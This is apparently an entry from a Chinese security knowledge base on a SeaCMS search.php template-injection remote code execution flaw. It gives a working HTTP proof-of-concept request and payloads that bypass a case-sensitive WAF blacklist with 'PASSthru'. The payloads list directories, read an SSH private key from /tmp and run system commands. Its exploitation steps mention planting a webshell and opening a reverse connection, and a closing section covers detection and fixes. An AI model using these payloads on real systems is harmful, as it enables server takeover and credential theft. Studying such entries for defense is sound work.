---
id: web-php-rce-seacms-search-template-code-execution
title: 海洋CMS search.php 模板代码执行与 WAF 函数黑名单绕过
type: scenario
domain: web
path: web/php/rce
technique: seacms-template-injection
tags:
- php
- seacms
- cms
- template-injection
- rce
- waf-bypass
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-E
  verified_at: '2026-11-04T19:20:27+08:00'
  notes: 已对照原文核对：search.php 嵌套 {searchpage:} 载荷、PASSthru 大小写绕过、ifconfig 回显与图 19 一致；原文图 16/17 对 phpinfo/print_r(scandir('.')) 显示 403，与正文“有输出”表述不一致，实际成功点为 PASSthru 与任务3 的 scandir('/tmp')；PoC 未在本机执行。
url: /docs/web/php/rce/web-php-rce-seacms-search-template-code-execution/
draft: false
kb_aliases:
- 海洋CMS RCE
- SeaCMS search.php 代码执行
- 海洋CMS 搜索模板注入
- PASSthru 大小写绕过
- searchpage 模板注入
---

## 一句话结论

海洋CMS 的 `search.php` 把搜索参数拼进模板表达式，构造 `{searchpage:...}` 与 `9[]=` 参数即可调用任意 PHP 函数；当 WAF 只做危险函数名黑名单时，利用 PHP 函数名大小写不敏感和同义函数替换（`PASSthru`、`scandir`、`nl`）可以继续执行系统命令。

## 原理

- 海洋CMS 的搜索页会把 `searchword`、`area`、`letter`、`lang`、`jq`、`ver` 等请求参数交给模板解析器，`{if ...}` 与 `{searchpage:...}` 标签在解析过程中被替换并拼接成一段可执行的 PHP 表达式。
- 攻击者用嵌套标签和 `join(...)` 把 POST 数组 `9[]` 的内容带入该表达式，模板编译/求值阶段执行数组元素中的 PHP 代码，因此 `9[]=phpinfo();`、`9[]=print_r(scandir('.'));` 等可以直接回显。
- WAF 的拦截依据是请求体中的危险函数名或命令字符串，属于大小写敏感的黑名单时：
  - PHP 函数名本身大小写不敏感，`passthru` 写成 `PASSthru` 仍可调用；
  - `ls` 被拦截时改用 `scandir()` 列目录；
  - `cat` 被拦截时改用 `nl`、`tac`、`head` 等命令读取文件。
- 最终 `PASSthru('ifconfig')` 在页面回显网卡信息，证明代码执行已跨越到系统命令执行。

## 触发条件

- 目标为存在该搜索模板解析缺陷的海洋CMS版本；
- `search.php` 可访问，且 `searchtype`/`searchword` 等参数进入模板解析；
- 存在 Web 应用防火墙或函数黑名单，但其匹配规则可被大小写/同义函数绕过；
- PHP 未禁用 `passthru`、`scandir` 等函数，或存在其他可用回调。

## 利用步骤

1. 访问 `search.php`，用 `phpinfo()` 载荷确认模板求值点存在。
2. 用 `print_r(scandir('.'))` 确认目录读取；若被拦截，换 `scandir('/tmp')` 等路径。
3. 用 `PASSthru('id')` 或 `PASSthru('ifconfig')` 验证系统命令执行；按 WAF 反馈调整函数名大小写或改用 `system`、`shell_exec`、反引号等。
4. 读取 `/tmp`、配置文件、SSH 密钥等敏感数据，或写入 WebShell/建立回连。
5. 以 Web 进程权限继续收集内网信息。

## PoC

```http
POST /search.php HTTP/1.1
Host: target:28080
Content-Type: application/x-www-form-urlencoded

searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&ver=OST[9]))&9[]=phpinfo();
```

```text
# 列目录：ls 被拦截时使用 scandir
9[]=print_r(scandir('/tmp'));

# 读文件：cat 被拦截时使用 nl
9[]=PASSthru('nl /tmp/id_rsa');

# 执行命令：passthru 大小写变体
9[]=PASSthru('ifconfig');
```

## 变体与关联

- 变体：`system`/`exec`/`shell_exec`/反引号等回调；`file_get_contents` 读文件；`scandir`/`glob` 列目录；`nl`/`tac`/`head` 替代 `cat`；大小写、拼接、编码绕过函数名黑名单。
- 关联：[[web-php-file-inclusion-thinkphp-view-template]]（PHP 模板/包含类 RCE）；[[web-generic-file-upload-encrypted-webshell-av-bypass]]（落地 WebShell 时的内容查杀绕过）。
- 影响边界：案例中 Web 进程可执行系统命令并读取 `/tmp` 下的 SSH 私钥，已构成主机控制；若 PHP 禁用相关函数且 WAF 做语义检测，需要另找回调或写入文件。

## 检测与防御

- 检测：`search.php` POST 体中出现 `{searchpage:`、`{if`、`9[]=`、`join(` 等组合；WAF 日志中同一来源反复触发 403/404 后出现 200；PHP 进程派生子进程执行 `ifconfig`、`nl`、`id`；访问日志中出现对 `/tmp` 等路径的读取。
- 修复：升级海洋CMS 到修复版本；对搜索参数做严格白名单/转义，禁止模板标签进入求值；移除不必要的模板解析入口。
- 缓解：WAF 规则对函数名做大小写归一和同义函数覆盖；PHP `disable_functions` 禁用危险函数；Web 进程降权运行；限制 Web 目录对 `/tmp`、SSH 目录的读取。
